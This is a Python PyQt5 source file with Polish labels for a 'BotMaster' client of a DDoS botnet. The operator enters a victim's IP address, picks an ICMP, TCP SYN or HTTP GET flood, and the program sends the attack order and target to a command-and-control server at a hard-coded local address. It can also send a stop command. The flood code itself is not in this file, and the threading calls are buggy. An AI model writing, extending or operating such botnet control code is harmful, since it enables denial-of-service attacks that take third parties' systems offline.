import sys
import time
import socket
import threading

from PyQt5.QtWidgets import *
from PyQt5.QtGui import *

ip = ["", "", "", ""]
attack = 0
#HOST = '127.0.0.1'  # The server's hostname or IP address
# HOST = '192.168.100.11'
HOST = '192.168.100.7'
PORT = 65432  # The port used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def est_connection():

    global flag,s
    flag = 0


    while flag != 1:
        try:
            s.connect((HOST, PORT))
            print("Connected")
            s.sendall('2'.encode())  # inform c&c that this client is the Botmaster
            flag = 1
        except ConnectionRefusedError:
            flag = 0
            time.sleep(1)
            print('Error: ')
            continue
        except KeyboardInterrupt:
            print('See you next time!!')


    print("ip: " + str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+ip[3]))
    print("attack type: " + str(attack))

    s.send(str(attack).encode())
    s.send(str(str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+ip[3])).encode())

    return

def stop_attack():
    global s
    s.send('x'.encode())
    s.send("127.0.0.1".encode())
    return

class Example(QWidget):
    # zmienne odpowiedzialne za kontrolę aplikacji
    # typ ataku
    selectedAttackType = 0
    # adres
    victimIpAddress = ["", "", "", ""]
    # flaga poprawnosci adresu
    checkIp = 0
    # flaga poprawnosci ataku
    checkType = 0

    def __init__(self):
        super(Example, self).__init__()
        self.initUI()

    def initUI(self):
        self.setGeometry(300, 300, 500, 100)

        grid = QGridLayout()

        # Label IP, po wczytaniu poprawnego tu pojawia sie IP ofiary
        self.ipState = QLabel("1. Podaj adres IP ofiary")
        grid.addWidget(self.ipState, 0, 0, 1, 1)

        # Label typu ataku, po poprawnym wyborze tu pojawia sie typ ataku
        self.attackState = QLabel("2. Wybierz typ ataku")
        grid.addWidget(self.attackState, 0, 1, 1, 1)

        # Label ataku
        # W PRZYSZLOSCI
        # Mozna tu zaimplementowac sygnal "atak w trakcie"
        self.generalState = QLabel("3. Atakuj")
        grid.addWidget(self.generalState, 0, 2, 1, 1)

        # Widget wczytywania ip z paska
        self.titleEdit = QLineEdit()
        self.titleEdit.setInputMask("000.000.000.000")
        grid.addWidget(self.titleEdit, 1, 0, 1, 2)

        # Button zatwierdzajaczy wczytanie IP wywyłuje funckje getIp
        self.readButton = QPushButton("Czytaj IP")
        grid.addWidget(self.readButton, 1, 2, 1, 1)
        self.readButton.clicked.connect(self.getIP)

        # Typ ataku1
        self.attackButton_1 = QPushButton("ICMP Flood")
        self.attackButton_1.setCheckable(True)
        self.attackButton_1.clicked.connect(self.buttonAttackState)
        grid.addWidget(self.attackButton_1, 2, 0, 1, 1)

        # Typ Ataku2
        self.attackButton_2 = QPushButton("TCP SYN Flood")
        self.attackButton_2.setCheckable(True)
        self.attackButton_2.clicked.connect(self.buttonAttackState)
        grid.addWidget(self.attackButton_2, 2, 1, 1, 1)

        # Typ Ataku3
        self.attackButton_3 = QPushButton("HTTP GET Flood")
        self.attackButton_3.setCheckable(True)
        self.attackButton_3.clicked.connect(self.buttonAttackState)
        grid.addWidget(self.attackButton_3, 2, 2, 1, 1)

        # Zatweirdzenie ataku, domyslnie disabled, opcja pojawia sie przy
        # poprawnym wyborze IP i typu
        self.confirmAttack = QPushButton("ATAKUJ")
        self.confirmAttack.setCheckable(True)
        self.confirmAttack.setEnabled(False)
        self.confirmAttack.clicked.connect(self.startAttack)
        grid.addWidget(self.confirmAttack, 3, 0, 1, 1)

        # Przerwij atak, pojawia sie po rozpoczeciu ataku
        self.breakAttack = QPushButton("PRZERWIJ ATAK")
        self.breakAttack.setCheckable(True)
        self.breakAttack.setEnabled(False)
        self.breakAttack.clicked.connect(self.stopAttack)
        grid.addWidget(self.breakAttack, 3, 1, 1, 1)

        # Label odpowiedzialny za raportowanie bledow programu
        self.errorState = QLabel("-- Tu pojawiać się będą opisy ostatnich błędów --")
        grid.addWidget(self.errorState, 4, 0, 1, 3)

        self.setLayout(grid)
        self.setWindowTitle('BotMaster - Aplikacja Kliencka')
        self.show()

    # Wywolywane przez readButton zczytuje IP, i waliduje
    # ustawia flage poprawnosci checkIP
    def getIP(self):
        ip_read = self.titleEdit.text()
        self.victimIpAddress = ip_read.split(".", 4)
        check = 1
        # global ip
        # ip = victimIpAddress

        for i in self.victimIpAddress:
            # if len(i) != 3:
            #     self.errorState.setText("-- Podałeś adres IP w złym formacie, podaj poprawny --")
            #     self.ipState.setText("1. Podaj adres IP ofiary")
            #     check = 0
            #     self.checkIp = 0
            #     break
            if int(i) > 255:
                self.errorState.setText("-- Podałeś zły adres IP, podaj poprawny --")
                self.ipState.setText("1. Podaj adres IP ofiary")
                check = 0
                self.checkIp = 0

        if check == 1:
            self.ipState.setText("-- " + ip_read + " --")
            self.checkIp = 3
            self.checkSum()

    # Wywylywane przez klikniecie przyciskow ataku
    # jezeli klikniety wiecej niz 1 - resetuje przyciski
    # ustawia flage poprawnosci typu ataku
    def buttonAttackState(self):
        if self.attackButton_1.isChecked() and self.attackButton_2.isChecked() and self.attackButton_3.isChecked():
            self.resetButtons()
            self.checkType = 0
            self.errorState.setText("-- Wybrałeś więcej niż 1 typ ataku, wybór został zresetowany --")
            self.attackState.setText("2. Wybierz typ ataku")
            self.checkSum()
        elif (self.attackButton_1.isChecked() and self.attackButton_2.isChecked()) or (
                self.attackButton_1.isChecked() and self.attackButton_3.isChecked()) or (
                self.attackButton_3.isChecked() and self.attackButton_2.isChecked()):
            self.resetButtons()
            self.checkType = 0
            self.errorState.setText("-- Wybrałeś więcej niż 1 typ ataku, wybór został zresetowany --")
            self.attackState.setText("2. Wybierz typ ataku")
            self.checkSum()
        elif self.attackButton_1.isChecked() == False and self.attackButton_2.isChecked() == False and self.attackButton_3.isChecked() == False:
            self.selectedAttackType = 0
            self.checkType = 0
            self.checkSum()
        else:
            if self.attackButton_1.isChecked():
                self.selectedAttackType = 1
                self.checkType = 3
                self.attackState.setText("-- ICMP Flood --")
                self.checkSum()
            elif self.attackButton_2.isChecked():
                self.selectedAttackType = 2
                self.checkType = 3
                self.attackState.setText("-- TCP SYN Flood --")
                self.checkSum()
            elif self.attackButton_3.isChecked():
                self.selectedAttackType = 3
                self.checkType = 3
                self.attackState.setText("-- Atak 3 --")
                self.checkSum()

    # resetuje przyciski w przypadku bledu
    # wywolywana z buttonAttackState
    def resetButtons(self):
        if self.attackButton_1.isChecked():
            self.attackButton_1.toggle()
        if self.attackButton_2.isChecked():
            self.attackButton_2.toggle()
        if self.attackButton_3.isChecked():
            self.attackButton_3.toggle()
        self.selectedAttackType = 0

    # srawdzenie checksumy i odblokowanie przycisku atakuj
    def checkSum(self):
        if (self.checkType + self.checkIp) == 6:
            self.confirmAttack.setEnabled(True)
        else:
            self.confirmAttack.setEnabled(False)

    # po wystartowaniu ataku wylacza przycisk atakuj i wlacz przerwij  atak
    def startAttack(self):
        print("attack started")
        global attack, ip
        attack = self.selectedAttackType
        ip = self.victimIpAddress

        threading.Thread(target=est_connection(), daemon=True)
        self.confirmAttack.setEnabled(False)
        self.breakAttack.setEnabled(True)

    # po zatrzymaniu ataku wylacza przerwij atak i jezeli checksum jest poprawny wlacza przycisk atakuj
    def stopAttack(self):
        print("stopping attack")
        threading.Thread(target=stop_attack(), daemon=True)

        self.breakAttack.setEnabled(False)

        self.checkSum()


def main():


    print("wątek odpalony")
    app = QApplication(sys.argv)
    ex = Example()
    #time.sleep(10)
    #threading.Thread(target=est_connection(), daemon=False)
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
